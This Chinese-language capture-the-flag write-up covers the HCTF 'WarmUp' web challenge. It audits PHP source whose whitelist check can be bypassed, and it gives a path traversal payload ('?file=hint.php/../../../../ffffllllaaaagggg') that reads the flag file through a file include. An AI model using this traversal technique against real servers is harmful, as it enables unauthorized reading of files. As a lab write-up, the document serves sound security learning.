#WarmUp

通过查看页面源码可以看见source.php文件的提示
![htcf1](https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/hctf1.jpg)

通过构造/source.php获取源码，并又得到一个文件名hint.php，然后通过构造/hint.php获取一个页面，可见flag在ffffllllaaaagggg文件中
![hctf2](https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/hctf2.jpg)

然后审计代码
```
 <?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"]; #创建白名单
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            } #判断$page是否为空，若为不为空，则是false

            if (in_array($page, $whitelist)) {
                return true;
            } #查看白名单中是否有$page变量里的东西，有则是true

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            ); #截取问号前的字符串，给$_page
            if (in_array($_page, $whitelist)) {
                return true;
            }#查看白名单中是否有$_page变量里的东西，有则是true

            $_page = urldecode($page); #对$page进行url解码
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );#截取$_page中问好前的东西，在赋给$_page
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        } #查看白名单中是否有$_page变量里的东西，有则是true
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    )#判断输入变量是否为空，将其转换为字符串，调用类emmm的方法checkFile()方法是否返回true
 {
        include $_REQUEST['file']; #运行目录下的文件
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 
```
通过上面的代码审计，可以构造payload
```
?file=hint.php/../../../../ffffllllaaaagggg
```
最后得到
![hctf3](https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/hctf3.jpg)

注意：../是跳转到上级目录的意思
